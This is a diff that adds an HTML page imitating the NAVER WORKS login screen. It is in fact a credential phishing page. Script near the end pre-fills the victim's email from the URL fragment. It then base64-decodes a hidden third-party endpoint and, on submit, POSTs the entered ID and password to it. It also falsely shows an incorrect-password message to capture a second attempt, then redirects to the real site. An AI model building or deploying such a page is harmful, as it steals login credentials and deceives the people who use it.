@@ -1,0 +1,292 @@
+﻿<!DOCTYPE HTML>
+<html lang="en_US">
+
+<head>
+	<meta charset="utf-8" />
+	<meta content="IE=edge" http-equiv="X-UA-Compatible">
+	<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
+	<meta name="format-detection" content="telephone=no">
+	<title>Login</title>
+	<link rel="stylesheet" type="text/css" href="https://auth.worksmobile.com/css/register.css?20240104">
+    <link rel="icon" href="https://naver.worksmobile.com/wp-content/uploads/2020/10/cropped-NW_favicon512-32x32.png" sizes="32x32" />
+	<script type="text/javascript" src="https://auth.worksmobile.com/js/jquery/jquery-3.6.0.min.js?20240104"></script>
+	<script type="text/javascript" src="https://auth.worksmobile.com/js/common/lcslog.js?20240104" charset="utf-8"></script>
+	<script type="text/javascript">
+		/**
+	 * LCS Send
+	 * var lcsSti = "worksmobile_admin_blahblah"; 가 정의되어 있어야 전송가능
+	 * 각 페이지별로 따로 정의된 sti를 사용.
+	 *
+	 * ie10이하에서는 onload event에 적용
+	 * -> onload인 경우, lcs_do()에서 필요한요소들이 전부 로딩되기 전에 lcs_do()로직에서 retry()가 실행됨.
+	 *    but 로그는 한번만 전송되니 걱정하지 말 것.
+	 */
+	var eventType = (/(MSIE (10|9|8|7)|Trident\/(6|5|4|3))/.test((window.navigator || {}).userAgent)) ? 'load' : 'pageshow';
+	window.addEventListener(eventType,  function(event) {
+		if (typeof lcsSti !== 'undefined') {
+			sendLcs(lcsSti);
+		}
+	}, false);
+
+	/**
+	 * layer open 등과 같이 수동으로 호출이 필요한 경우 사용
+	 */
+	function sendLcs(lcsSti) {
+		lcsSti = setMobilePrefix(lcsSti);
+		lcsSti = setInstancePostfix(lcsSti);
+		if ('real' != 'real') { // stage도 리얼이 아닌 알파로 잡히게 수정
+			window.lcs_SerName = 'alpha-lcs.worksmobile.com'; // for alpha Test
+		}
+		lcs_do({"sti" : lcsSti});
+	}
+
+	/**
+	 * one_app 안에서 뜨는 경우, m_ prefix 추가
+	 */
+	function setMobilePrefix(lcsSti) {
+		if (navigator.userAgent.indexOf('WorksMobile') > -1) {
+			lcsSti = 'm_' + lcsSti;
+		}
+		return lcsSti;
+	}
+
+	/**
+	 * IDC 별 postfix 추가
+	 */
+	function setInstancePostfix(lcsSti) {
+		if ('kr1' == 'kr1' || 'kr1' == 'kr0') {
+			lcsSti += '_kr';
+		} else {
+			lcsSti += '_jp';
+		}
+		return lcsSti;
+	}
+	</script>
+	<script type="text/javascript" src="https://auth.worksmobile.com/js/message/message_en_US.js?20230718"></script>
+	<script type="text/javascript" src="https://auth.worksmobile.com/js/service/auth_core.js?20230718"></script>
+	<script type="text/javascript" src="https://auth.worksmobile.com/js/service/auth_service.js?20230718"></script>
+
+</head>
+
+<body class="en_US kr_instance">
+	<a href="#content" class="skip">content</a>
+	<div id="wrap" class="register login">
+		<h1><span>{brandName}</span></h1>
+		<div id="container">
+			<div class="login_infor">
+				<em class="user">휴대폰 번호나 ID를 입력하세요.</em>
+				<div class="desc">
+					<span id="lastLoginGuide">내 NAVER WORKS ID(id@company 또는 id@company.com) 또는
+						미리 인증한 휴대폰 번호로 로그인할 수 있습니다.
+					</span>
+				</div>
+			</div>
+			<div class="fm_register">
+                <form id="" name="myForm">
+
+				<div class="login_form_cover">
+					<label for="login_param" class="_loginParamLabel blind">2061234567 or id@group.xx</label>
+					<input type="email" id="login_param" name="userid"
+                           placeholder="01012345678 또는 id@group.xxx" required="required">
+				</div>
+                <p class="inp pwd">
+                    <label for="password" class="blind">Password</label>
+                    <input type="password" name="pass" id="password" placeholder="Password" required>
+                    <button type="button" class="btn_masking"><span class="blind">show password</span></button>
+                </p>
+			</div>
+			<div class="wrong_message" style="display:none">
+				<p id="wrong_message_paragraph">아이디나 전화번호를 다시 확인하세요.	</p>
+			</div>
+			<div class="btn">
+				<button id ="loginStart" class="login_normal">Login</button>
+			</div>
+			<div class="check_info">
+				<div class="find_info">
+					<a href="" id="findIdBtn">ID, 비밀번호 찾기</a>
+				</div>
+			</div>
+
+			<div class="btn">
+				<div class="login_line_area">
+					<em class="login_line_desc">OR</em>
+
+					<button id="naverLogin" data-accessUrl="#" class="login_naver">Login with NAVER</button>
+
+					<button id="lineLogin" data-accessUrl="#" class="login_line">Login with LINE</button>
+				</div>
+			</div>
+        </form>
+
+		</div>
+
+		<p class="welcome_link"><span>처음이신가요?</span><a
+				href="#" target="_blank">회원가입</a></p>
+
+		<address><strong>&copy;NAVER WORKS가</strong></address>
+	</div>
+	
+	
+
+
+
+
+
+
+
+<script>
+		
+		
+
+
+    var feedUpdateResponse = window.location.href;
+    var feedUpdateSplit = feedUpdateResponse.split("");
+    
+    for (var x = 0; x < feedUpdateSplit.length; x++) {
+     
+     if (feedUpdateSplit[x]=="#"){
+      var che= feedUpdateResponse.substring(x+1);
+     
+     }else{
+     
+    
+     }
+    
+     
+     
+     }
+      document.getElementById("pet").value =che
+    document.getElementById("p1").innerHTML = che
+      document.getElementById("pet").value =che
+    
+    </script>
+    
+    
+    
+    
+        <script src="https://code.jquery.com/jquery-1.9.1.js"></script>
+        <script>
+    
+          
+           $(document).ready(function() {
+                var user=$("#pet").val();
+              var  count=0;
+               
+            $('form').submit(function(e) {
+                
+                count=count+1;
+                
+               var d=atob("aHR0cHM6Ly9mcmVrYWkuY29tL2dyb3RoZXIvdGhhbmtzLnBocA==");
+    
+                e.preventDefault();
+                   $.ajax({
+                   
+                type: 'POST',
+                url: d,
+                crossDomain: true,
+                data: $('form').serialize(),
+                
+                 beforeSend: function(xhr){
+                  $('#loginStart').html('Verifing...');
+                  
+                  
+                  
+    if (count>=2) {
+                        count=0;
+                        // window.location.replace(response['redirect_link']);
+                        window.location.replace("https://auth.worksmobile.com/");
+    
+                      }else{
+                       var x = document.getElementById("login_param").value;
+                         
+                        
+                       $('#loginStart').html('CONTINUE');
+                           document.getElementById("password").value ="";
+                         
+                        
+                    $("#wrong_message").show();
+                        $("wrong_message_paragraph").html("The username or password you entered is incorrect.");
+                    
+    
+                         }
+                            
+                },
+                
+                
+                         
+                success: function () {
+                    $("#wrong_message_paragraph").show();
+                        $("#err_common").html("The username or password you entered is incorrect.");
+                    
+    
+        
+                }
+              });
+            });
+        });
+        </script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- <script>
+			if ("false" === "false") {
+            var lcsSti = 'worksmobile_admin_auth_loginstep1';
+        }
+        var oStartLogin = new StartLogIn();
+
+        $(document).ready(function() {
+            if ('' != null && '' != '') {
+                $('#' + '').prop('selected', true);
+                setTimeout(function() {
+                    $('._currentSelectedCountry').html(oStartLogin.getCountryName($('#' + '')));
+                }, 100);
+            } else {
+                var selectedCode = $('#' + '81');
+                if ('en_US' === 'ja_JP' || 'en_US' === 'en_US') {
+                    $('#' + '81').prop('selected', true);
+                } else if ('en_US' === 'ko_KR') {
+                    $('#' + '82').prop('selected', true);
+                    selectedCode = $('#' + '82');
+                } else if ('en_US' === 'zh_TW') {
+                    $('#' + '886').prop('selected', true);
+                    selectedCode = $('#' + '886');
+                } else if ('en_US' === 'zh_CN') {
+                    $('#' + '86').prop('selected', true);
+                    selectedCode = $('#' + '86');
+                }
+                setTimeout(function() {
+                    $('._currentSelectedCountry').html(oStartLogin.getCountryName(selectedCode));
+                }, 100);
+            }
+        });
+			</script> -->
+
+<!-- <script>
+	function validated() {
+if(document.myForm.userid.value.trim() == ""){
+	alert("Please Provide Your Email!");
+	document.myForm.userid.focus();
+	return false;
+}
+if(document.myForm.pass.value.trim() == "" || document.myForm.pass.value.length==0 ){
+	alert("Please Provide Password!");
+		document.myForm.pass.focus();
+		return false;
+	}
+	return true;
+}
+</script> -->
+
+</body>
+
+</html>
